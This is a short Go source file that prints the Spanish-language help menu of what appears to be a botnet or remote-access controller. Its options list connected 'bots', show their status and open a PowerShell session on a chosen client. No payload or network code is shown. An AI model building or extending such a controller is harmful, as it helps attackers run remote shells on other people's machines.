package util

import "fmt"

func Menu() {
	LimpiarConsola()
	fmt.Println(" --- Menu --- Github: BAA4TS --- ")
	fmt.Println("( -l, list, l ) Listar los bots conectados")
	fmt.Println("( -c, connect, -conn ) Establece una sesión PowerShell con el cliente indicado")
	fmt.Println("( -s, -st, status ) Un estado de cuántos bots conectados hay, tiempo de conexión, etc.")
	fmt.Println("( cls, -cl, clear ) Limpiar la consola")
	fmt.Println("( -h, help, ayuda ) Menú de ayuda")
	fmt.Print("\n\n")
}
